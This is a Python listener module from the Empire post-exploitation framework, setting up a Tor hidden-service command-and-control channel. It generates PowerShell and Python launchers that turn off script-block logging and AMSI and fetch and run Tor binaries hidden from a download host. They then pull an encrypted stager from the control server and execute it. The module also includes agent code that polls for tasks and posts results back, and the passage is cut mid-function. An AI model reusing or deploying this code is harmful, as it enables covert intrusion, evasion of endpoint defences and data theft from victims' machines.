import logging
import base64
import random
import os
import ssl
import time
import copy
from pydispatch import dispatcher
from flask import Flask, request, make_response
import pdb
# Empire imports
from lib.common import helpers
from lib.common import agents
from lib.common import encryption
from lib.common import packets
from lib.common import messages
import requests
import zipfile
import shutil

class Listener:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'HTTP-TOR',

            'Author': ['@harmjoy'],

            'Description': ('Starts a preconfigured HiddenService listener (PowerShell) that uses a GET/POST approach.'),

            'Category' : ('client_server'),

            'Comments': ['Preconfigured Listener used with TOR. Launcher downloads and installs TOR on client.']
        }

        # any options needed by the stager, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}

            'Name' : {
                'Description'   :   'Name for the listener.',
                'Required'      :   True,
                'Value'         :   'http-tor'
            },
            'Host' : {
                'Description'   :   'http://URI.onion:PORT for staging.',
                'Required'      :   True,
                'Value'         :   "http://hiddenservice_hash.onion:50999"
            },
            'BindIP' : {
                'Description'   :   'The IP to bind to on the control server.',
                'Required'      :   True,
                'Value'         :   '127.0.0.1'
            },
            'Port' : {
                'Description'   :   'Port your hiddenservice listens on',
                'Required'      :   True,
                'Value'         :   50999
            },
            'Launcher' : {
                'Description'   :   'Launcher string.',
                'Required'      :   True,
                'Value'         :   'powershell -noP -sta -w 1 -enc '
            },
            'StagingKey' : {
                'Description'   :   'Staging key for initial agent negotiation.',
                'Required'      :   True,
                'Value'         :   '2c103f2c4ed1e59c0b4e2e01821770fa'
            },
            'DefaultDelay' : {
                'Description'   :   'Agent delay/reach back interval (in seconds).',
                'Required'      :   True,
                'Value'         :   5
            },
            'DefaultJitter' : {
                'Description'   :   'Jitter in agent reachback interval (0.0-1.0).',
                'Required'      :   True,
                'Value'         :   0.0
            },
            'DefaultLostLimit' : {
                'Description'   :   'Number of missed checkins before exiting',
                'Required'      :   True,
                'Value'         :   120
            },
            'DefaultProfile' : {
                'Description'   :   'Default communication profile for the agent.',
                'Required'      :   True,
                'Value'         :   "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            'CertPath' : {
                'Description'   :   'Directory path of X.509 certificates for https listeners. Must contain empire-chain.pem and empire-priv.key',
                'Required'      :   False,
                'Value'         :   ''
            },
            'KillDate' : {
                'Description'   :   'Date for the listener to exit (MM/dd/yyyy).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'WorkingHours' : {
                'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'ServerVersion' : {
                'Description'   :   'Server header for the control server.',
                'Required'      :   True,
                'Value'         :   'Microsoft-IIS/7.5'
            },
            'StagerURI' : {
                'Description'   :   'URI for the stager. Example: stager.php',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'http://127.0.0.1:8118'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'none'
            },
	    'TORPackURI' : {
		'Description'	:   'ClearNet URI for the launcher to download the custom TOR package to the client.',
		'Required'	:   True,
		'Value'		:   'http://somefilehost.com/TORPrivoxy.zip'
	    },
            'SocksAddress' : {
                'Description'   :   'TOR SOCKS for Download of binaries',
                'Required'      :   True,
                'Value'         :   '127.0.0.1'
            },
            'SocksPort' : {
                'Description'   :   'TOR SOCKS Port for Download of binaries',
                'Required'      :   True,
                'Value'         :   '9050'
            },
	    'HidServAuth': {
		'Description'	:   'Cookie for HidServAuth from /etc/tor/hid/hostnames',
		'Required'	:   False,
		'Value'		:   'hash.onion AUTHCOOKIE'

	    },

        }

        # required:
        self.mainMenu = mainMenu
        self.threads = {}

        # optional/specific for this module
        self.app = None
        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        # set the default staging key to the controller db default
        self.options['StagingKey']['Value'] = str(helpers.get_config('staging_key')[0])


    def default_response(self):
        """
        Returns a default HTTP server page.
        """
        page = "<html><body><h1>It works!</h1>"
        page += "<p>This is the default web page for this server.</p>"
        page += "<p>The web server software is running but no content has been added, yet.</p>"
        page += "</body></html>"
        return page


    def validate_options(self):
        """
        Validate all options for this listener.
        """

        self.uris = [a.strip('/') for a in self.options['DefaultProfile']['Value'].split('|')[0].split(',')]

        for key in self.options:
            if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
                print helpers.color("[!] Option \"%s\" is required." % (key))
                return False

        return True


    def generate_launcher(self, useWindowHandler='False', encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
        """
        Generate a basic launcher for the specified listener.
        """

        if not language:
            print helpers.color('[!] listeners/http generate_launcher(): no language specified!')

        if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):

            # extract the set options for this instantiated listener
            listenerOptions = self.mainMenu.listeners.activeListeners[listenerName]['options']
            launcher = listenerOptions['Launcher']['Value']
	    torpackuri = listenerOptions['TORPackURI']['Value']
            stagingKey = listenerOptions['StagingKey']['Value']
            profile = listenerOptions['DefaultProfile']['Value']
	    host = listenerOptions['Host']['Value']
	    proxy = listenerOptions['Proxy']['Value']
	    proxyCreds = listenerOptions['ProxyCreds']['Value']
            uris = [a for a in profile.split('|')[0].split(',')]
            stage0 = random.choice(uris)
            customHeaders = profile.split('|')[2:]
	    hidservauth = listenerOptions['HidServAuth']['Value']


            if language.startswith('po'):
                # PowerShell

                stager = ''

                if useWindowHandler.lower()=='true':
                        #Don't hide the window via parameter. Hide via WindowHandler.
                        stager += "$t = '[DllImport("
                        stager += helpers.randomize_capitalization('"user32.dll"')
                        stager += ")] public static extern bool ShowWindow"
                        stager += "(int handle, int state);'; "
                        stager += helpers.randomize_capitalization("add-type -name win -member $t -namespace native;")
                        stager += " [native.win]::"
                        stager += "ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() "
                        stager += "| Get-Process).MainWindowHandle, 0);"
                        #Remove WindowsStyle parameter from launcher command
                        hideCmd = [" -w 1 "," -W 1 "," -W hidden "," -w hidden "," -w Hidden "]
                        for cmd in hideCmd:
                                launcher = launcher.replace(cmd," ")

                if safeChecks.lower() == 'true':
                    # ScriptBlock Logging bypass
                    stager += helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.Utils'"
                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"

                    # @mattifestation's AMSI bypass
                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                    stager += "'System.Management.Automation.AmsiUtils'"
                    stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                    stager += "'amsiInitFailed','NonPublic,Static'"
                    stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
                    stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")

		    #FETCH TOR PACK AND DEPLOY TO TEMP FOLDER
		stager += "[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"
		stager += "(New-Object Net.WebClient).DownloadFile('"+torpackuri+"','C:\Windows\Temp\update.zip');"
		stager += "(New-Object -com shell.application).namespace('C:\Windows\Temp').CopyHere((New-Object -com shell.application).namespace('C:\Windows\Temp\update.zip').Items());"
		stager += "Set-Location C:\Windows\Temp;"
		stager += "Start-Process -WindowStyle hidden -FilePath 'C:\Windows\Temp"
		stager += "\\tor.exe';"
		stager += "Start-Process -WindowStyle hidden -FilePath 'C:\Windows\Temp\privoxy.exe';"

                stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]
                stager += "$u='"+userAgent+"';"

                if 'https' in host:
                    # allow for self-signed certificates for https connections
                    stager += "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                if userAgent.lower() != 'none' or proxy.lower() != 'none':

                    if userAgent.lower() != 'none':
                        stager += helpers.randomize_capitalization('$wc.Headers.Add(')
                        stager += "'User-Agent',$u);"

                    if proxy.lower() != 'none':
                        if proxy.lower() == 'default':
                            stager += helpers.randomize_capitalization("$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;")
                        else:
                            # TODO: implement form for other proxy
                            stager += helpers.randomize_capitalization("$proxy=New-Object Net.WebProxy;")
                            stager += helpers.randomize_capitalization("$proxy.Address = '"+ proxy.lower() +"';")
                            stager += helpers.randomize_capitalization("$wc.Proxy = $proxy;")
			if proxyCreds.lower() == "none":
				False
                        elif proxyCreds.lower() == "default":
                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                        else:
                            # TODO: implement form for other proxy credentials
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            domain = username.split('\\')[0]
                            usr = username.split('\\')[1]
                            stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")

                        #save the proxy settings to use during the entire staging process and the agent
                        stager += "$Script:Proxy = $wc.Proxy;"

                # TODO: reimplement stager retries?
                #check if we're using IPv6
                listenerOptions = copy.deepcopy(listenerOptions)
                bindIP = listenerOptions['BindIP']['Value']
                port = listenerOptions['Port']['Value']
                if ':' in bindIP:
                    if "http" in host:
                        if "https" in host:
                            host = 'https://' + '[' + str(bindIP) + ']' + ":" + str(port)
                        else:
                            host = 'http://' + '[' + str(bindIP) + ']' + ":" + str(port)

                # code to turn the key string into a byte array
                stager += helpers.randomize_capitalization("$K=[System.Text.Encoding]::ASCII.GetBytes(")
                stager += "'%s');" % (stagingKey)

                # this is the minimized RC4 stager code from rc4.ps1
                stager += helpers.randomize_capitalization('$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};')

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='POWERSHELL', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                #Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(':')[0]
                        headerValue = header.split(':')[1]
			#If host header defined, assume domain fronting is in use and add a call to the base URL first
			#this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
			if headerKey.lower() == "host":
			    stager += "$clr='%s';" % (host)
			    stager += helpers.randomize_capitalization("$WC.DownloadData($clr);")
                        stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                        stager += "\"%s\",\"%s\");" % (headerKey, headerValue)

                # add the RC4 packet to a cookie

                stager += helpers.randomize_capitalization("$wc.Headers.Add(")
                stager += "\"Cookie\",\"session=%s\");" % (b64RoutingPacket)

                stager += "$ser='%s';$t='%s';" % (host, stage0)
                stager += helpers.randomize_capitalization("$data=$WC.DownloadData($ser+$t);")
                stager += helpers.randomize_capitalization("$iv=$data[0..3];$data=$data[4..$data.length];")

                # decode everything and kick it over to IEX to kick off execution
                stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")

                if obfuscate:
                    stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
                # base64 encode the stager and return it
                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                    return helpers.powershell_launcher(stager, launcher)
                else:
                    # otherwise return the case-randomized stager
                    return stager

            if language.startswith('py'):
                # Python

                launcherBase = 'import sys;'
                if "https" in host:
                    # monkey patch ssl woohooo
                    launcherBase += "import ssl;\nif hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;\n"

                try:
                    if safeChecks.lower() == 'true':
                        launcherBase += "import re, subprocess;"
                        launcherBase += "cmd = \"ps -ef | grep Little\ Snitch | grep -v grep\"\n"
                        launcherBase += "ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n"
                        launcherBase += "out = ps.stdout.read()\n"
                        launcherBase += "ps.stdout.close()\n"
                        launcherBase += "if re.search(\"Little Snitch\", out):\n"
                        launcherBase += "   sys.exit()\n"
                except Exception as e:
                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                    print helpers.color(p, color='red')

                if userAgent.lower() == 'default':
                    profile = listenerOptions['DefaultProfile']['Value']
                    userAgent = profile.split('|')[1]

                launcherBase += "import urllib2;\n"
                launcherBase += "UA='%s';" % (userAgent)
                launcherBase += "server='%s';t='%s';" % (host, stage0)

                # prebuild the request routing packet for the launcher
                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='PYTHON', meta='STAGE0', additional='None', encData='')
                b64RoutingPacket = base64.b64encode(routingPacket)

                launcherBase += "req=urllib2.Request(server+t);\n"
                # add the RC4 packet to a cookie
                launcherBase += "req.add_header('User-Agent',UA);\n"
                launcherBase += "req.add_header('Cookie',\"session=%s\");\n" % (b64RoutingPacket)

                # Add custom headers if any
                if customHeaders != []:
                    for header in customHeaders:
                        headerKey = header.split(':')[0]
                        headerValue = header.split(':')[1]
                        #launcherBase += ",\"%s\":\"%s\"" % (headerKey, headerValue)
                        launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)


                if proxy.lower() != "none":
                    if proxy.lower() == "default":
                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
                    else:
                        proto = proxy.Split(':')[0]
                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"

                    if proxyCreds != "none":
                        if proxyCreds == "default":
                            launcherBase += "o = urllib2.build_opener(proxy);\n"
                        else:
                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
                            username = proxyCreds.split(':')[0]
                            password = proxyCreds.split(':')[1]
                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
                    else:
                        launcherBase += "o = urllib2.build_opener(proxy);\n"
                else:
                    launcherBase += "o = urllib2.build_opener();\n"

                #install proxy and creds globally, so they can be used with urlopen.
                launcherBase += "urllib2.install_opener(o);\n"

                # download the stager and extract the IV

                launcherBase += "a=urllib2.urlopen(req).read();\n"
                launcherBase += "IV=a[0:4];"
                launcherBase += "data=a[4:];"
                launcherBase += "key=IV+'%s';" % (stagingKey)

                # RC4 decryption
                launcherBase += "S,j,out=range(256),0,[]\n"
                launcherBase += "for i in range(256):\n"
                launcherBase += "    j=(j+S[i]+ord(key[i%len(key)]))%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "i=j=0\n"
                launcherBase += "for char in data:\n"
                launcherBase += "    i=(i+1)%256\n"
                launcherBase += "    j=(j+S[i])%256\n"
                launcherBase += "    S[i],S[j]=S[j],S[i]\n"
                launcherBase += "    out.append(chr(ord(char)^S[(S[i]+S[j])%256]))\n"
                launcherBase += "exec(''.join(out))"

                if encode:
                    launchEncoded = base64.b64encode(launcherBase)
                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
                    return launcher
                else:
                    return launcherBase

            else:
                print helpers.color("[!] listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module.")

        else:
            print helpers.color("[!] listeners/http generate_launcher(): invalid listener name specification!")


    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
        """
        Generate the stager code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/http generate_stager(): no language specified!')
            return None


        profile = listenerOptions['DefaultProfile']['Value']
        uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
        launcher = listenerOptions['Launcher']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        killDate = listenerOptions['KillDate']['Value']
        host = listenerOptions['Host']['Value']
        customHeaders = profile.split('|')[2:]

        # select some random URIs for staging from the main profile
        stage1 = random.choice(uris)
        stage2 = random.choice(uris)

        if language.lower() == 'powershell':

            # read in the stager base
            f = open("%s/data/agent/stagers/http.ps1" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            # make sure the server ends with "/"
            if not host.endswith("/"):
                host += "/"

            #Patch in custom Headers
            if customHeaders != []:
                headers = ','.join(customHeaders)
                stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")

            #patch in working hours, if any
            if workingHours != "":
                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)

            #Patch in the killdate, if any
            if killDate != "":
                stager = stager.replace('REPLACE_KILLDATE', killDate)

            # patch the server and key information
            stager = stager.replace('REPLACE_SERVER', host)
            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
            stager = stager.replace('index.jsp', stage1)
            stager = stager.replace('index.php', stage2)

            randomizedStager = ''

            for line in stager.split("\n"):
                line = line.strip()
                # skip commented line
                if not line.startswith("#"):
                    # randomize capitalization of lines without quoted strings
                    if "\"" not in line:
                        randomizedStager += helpers.randomize_capitalization(line)
                    else:
                        randomizedStager += line

            if obfuscate:
                randomizedStager = helpers.obfuscate(randomizedStager, obfuscationCommand=obfuscationCommand)
            # base64 encode the stager and return it
            if encode:
                return helpers.enc_powershell(randomizedStager)
            elif encrypt:
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, randomizedStager)
            else:
                # otherwise just return the case-randomized stager
                return randomizedStager

        elif language.lower() == 'python':
            # read in the stager base
            f = open("%s/data/agent/stagers/http.py" % (self.mainMenu.installPath))
            stager = f.read()
            f.close()

            stager = helpers.strip_python_comments(stager)

            if host.endswith("/"):
                host = host[0:-1]

            if workingHours != "":
                stager = stager.replace('SET_WORKINGHOURS', workingHours)

            if killDate != "":
                stager = stager.replace('SET_KILLDATE', killDate)

            # # patch the server and key information
            stager = stager.replace("REPLACE_STAGING_KEY", stagingKey)
            stager = stager.replace("REPLACE_PROFILE", profile)
            stager = stager.replace("index.jsp", stage1)
            stager = stager.replace("index.php", stage2)

            # # base64 encode the stager and return it
            if encode:
                return base64.b64encode(stager)
            if encrypt:
                # return an encrypted version of the stager ("normal" staging)
                RC4IV = os.urandom(4)
                return RC4IV + encryption.rc4(RC4IV+stagingKey, stager)
            else:
                # otherwise return the standard stager
                return stager

        else:
            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
        """
        Generate the full agent code needed for communications with this listener.
        """

        if not language:
            print helpers.color('[!] listeners/http generate_agent(): no language specified!')
            return None

        language = language.lower()
        delay = listenerOptions['DefaultDelay']['Value']
        jitter = listenerOptions['DefaultJitter']['Value']
        profile = listenerOptions['DefaultProfile']['Value']
        lostLimit = listenerOptions['DefaultLostLimit']['Value']
        killDate = listenerOptions['KillDate']['Value']
        workingHours = listenerOptions['WorkingHours']['Value']
        b64DefaultResponse = base64.b64encode(self.default_response())

        if language == 'powershell':

            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_powershell_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('$AgentDelay = 60', "$AgentDelay = " + str(delay))
            code = code.replace('$AgentJitter = 0', "$AgentJitter = " + str(jitter))
            code = code.replace('$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', "$Profile = \"" + str(profile) + "\"")
            code = code.replace('$LostLimit = 60', "$LostLimit = " + str(lostLimit))
            code = code.replace('$DefaultResponse = ""', '$DefaultResponse = "'+str(b64DefaultResponse)+'"')

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
            if obfuscate:
                code = helpers.obfuscate(code, obfuscationCommand=obfuscationCommand)
            return code

        elif language == 'python':
            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
            code = f.read()
            f.close()

            # patch in the comms methods
            commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
            code = code.replace('REPLACE_COMMS', commsCode)

            # strip out comments and blank lines
            code = helpers.strip_python_comments(code)

            # patch in the delay, jitter, lost limit, and comms profile
            code = code.replace('delay = 60', 'delay = %s' % (delay))
            code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
            code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
            code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
            code = code.replace('defaultResponse = base64.b64decode("")', 'defaultResponse = base64.b64decode("%s")' % (b64DefaultResponse))

            # patch in the killDate and workingHours if they're specified
            if killDate != "":
                code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
            if workingHours != "":
                code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))

            return code
        else:
            print helpers.color("[!] listeners/http generate_agent(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")


    def generate_comms(self, listenerOptions, language=None):
        """
        Generate just the agent communication code block needed for communications with this listener.

        This is so agents can easily be dynamically updated for the new listener.
        """

        if language:
            if language.lower() == 'powershell':

                updateServers = """
                    $Script:ControlServers = @("%s");
                    $Script:ServerIndex = 0;
                """ % (listenerOptions['Host']['Value'])

                if listenerOptions['Host']['Value'].startswith('https'):
                    updateServers += "\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};"

                getTask = """
                    function script:Get-Task {

                        try {
                            if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {

                                # meta 'TASKING_REQUEST' : 4
                                $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4
                                $RoutingCookie = [Convert]::ToBase64String($RoutingPacket)

                                # build the web request object
                                $wc = New-Object System.Net.WebClient

                                # set the proxy settings for the WC to be the default system settings
                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                if($Script:Proxy) {
                                    $wc.Proxy = $Script:Proxy;
                                }

                                $wc.Headers.Add("User-Agent",$script:UserAgent)
                                $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)}
                                $wc.Headers.Add("Cookie", "session=$RoutingCookie")

                                # choose a random valid URI for checkin
                                $taskURI = $script:TaskURIs | Get-Random
                                $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI)
                                $result
                            }
                        }
                        catch [Net.WebException] {
                            $script:MissedCheckins += 1
                            if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
                                # restart key negotiation
                                Start-Negotiate -S "$ser" -SK $SK -UA $ua
                            }
                        }
                    }
                """

                sendMessage = """
                    function script:Send-Message {
                        param($Packets)

                        if($Packets) {
                            # build and encrypt the response packet
                            $EncBytes = Encrypt-Bytes $Packets

                            # build the top level RC4 "routing packet"
                            # meta 'RESULT_POST' : 5
                            $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5

                            if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
                                # build the web request object
                                $wc = New-Object System.Net.WebClient
                                # set the proxy settings for the WC to be the default system settings
                                $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
                                $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
                                if($Script:Proxy) {
                                    $wc.Proxy = $Script:Proxy;
                                }

                                $wc.Headers.Add('User-Agent', $Script:UserAgent)
                                $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}

                                try {
                                    # get a random posting URI
                                    $taskURI = $Script:TaskURIs | Get-Random
                                    $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
                                }
                                catch [System.Net.WebException]{
                                    # exception posting data...
                                }
                            }
                        }
                    }
                """

                return updateServers + getTask + sendMessage

            elif language.lower() == 'python':

                updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])

                if listenerOptions['Host']['Value'].startswith('https'):
                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"

                sendMessage = """
def send_message(packets=None):
    # Requests a tasking or posts data to a randomized tasking URI.
    # If packets == None, the agent GETs a tasking from the control server.
    # If packets != None, the agent encrypts the passed packets and
    #    POSTs the data to the control server.

    global missedCheckins
    global server
    global headers
    global taskURIs

    data = None
    if packets:
        data = ''.join(packets)
        # aes_encrypt_then_hmac is in stager.py
        encData = aes_encrypt_then_hmac(key, data)
        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
    else:
        # if we're GETing taskings, then build the routing packet to stuff info a cookie first.
        #   meta TASKING_REQUEST = 4
        routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
        b64routingPacket = base64.b64encode(routingPacket)
        headers['Cookie'] = "session=%s" % (b64routingPacket)

    taskURI = random.sample(taskURIs, 1)[0]
    requestUri = server + taskURI

    try:
        data = (urllib2.urlopen(urllib2.Request(requestUri, data, headers))).read()
        return ('200', data)

    except urllib2.HTTPError as HTTPError:
        # if the server is reached, but returns an erro (like 404)
        missedCheckins = missedCheckins + 1
        return (HTTPError.code, '')

    except urllib2.URLError as URLerror:
        # if the server cannot be reached
        missedCheckins = missedCheckins + 1
        return (URLerror.reason, '')

    return ('', '')
"""
                return updateServers + sendMessage

            else:
                print helpers.color("[!] listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
        else:
            print helpers.color('[!] listeners/http generate_comms(): no language specified!')


    def start_server(self, listenerOptions):
        """
        Threaded function that actually starts up the Flask server.
        """

        # make a copy of the currently set listener options for later stager/agent generation
        listenerOptions = copy.deepcopy(listenerOptions)

        # suppress the normal Flask output
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)

        bindIP = listenerOptions['BindIP']['Value']
        host = listenerOptions['Host']['Value']
        port = listenerOptions['Port']['Value']
        stagingKey = listenerOptions['StagingKey']['Value']
        stagerURI = listenerOptions['StagerURI']['Value']
        userAgent = self.options['UserAgent']['Value']
        listenerName = self.options['Name']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        socksAddr = listenerOptions['SocksAddress']['Value']
        socksPort = listenerOptions['SocksPort']['Value']
	hidservauth = listenerOptions['HidServAuth']['Value']


        if socksAddr!='':
                if socksPort!='':
                        import socks
                        import socket
                        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, socksAddr, int(socksPort))
                        socket.socket = socks.socksocket
                        #><>Magic*~*!*+*zzZ) FIX FOR DNS LEAKING
                        def getaddrinfo(*args):
                                return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (args[0], args[1]))]
                        socket.getaddrinfo = getaddrinfo
			reload(requests)

        app = Flask(__name__)
        self.app = app


        @app.route('/<string:stagerURI>')
        def send_stager(stagerURI):
            if stagerURI:
                launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                return launcher
            else:
                pass
        @app.before_request
        def check_ip():
            """
            Before every request, check if the IP address is allowed.
            """
            if not self.mainMenu.agents.is_ip_allowed(request.remote_addr):
                dispatcher.send("[!] %s on the blacklist/not on the whitelist requested resource" % (request.remote_addr), sender="listeners/http")
                return make_response(self.default_response(), 200)


        @app.after_request
        def change_header(response):
            "Modify the default server version in the response."
            response.headers['Server'] = listenerOptions['ServerVersion']['Value']
            return response


        @app.after_request
        def add_proxy_headers(response):
            "Add HTTP headers to avoid proxy caching."
            response.headers['Cache-Control'] = "no-cache, no-store, must-revalidate"
            response.headers['Pragma'] = "no-cache"
            response.headers['Expires'] = "0"
            return response


        @app.route('/<path:request_uri>', methods=['GET'])
        def handle_get(request_uri):
            """
            Handle an agent GET request.

            This is used during the first step of the staging process,
            and when the agent requests taskings.
            """

            clientIP = request.remote_addr
            dispatcher.send("[*] GET request for %s/%s from %s" % (request.host, request_uri, clientIP), sender='listeners/http')
            routingPacket = None
            cookie = request.headers.get('Cookie')
            if cookie and cookie != '':
                try:
                    # see if we can extract the 'routing packet' from the specified cookie location
                    # NOTE: this can be easily moved to a paramter, another cookie value, etc.
                    if 'session' in cookie:
                        dispatcher.send("[*] GET cookie value from %s : %s" % (clientIP, cookie), sender='listeners/http')
                        cookieParts = cookie.split(';')
                        for part in cookieParts:
                            if part.startswith('session'):
                                base64RoutingPacket = part[part.find('=')+1:]
                                # decode the routing packet base64 value in the cookie
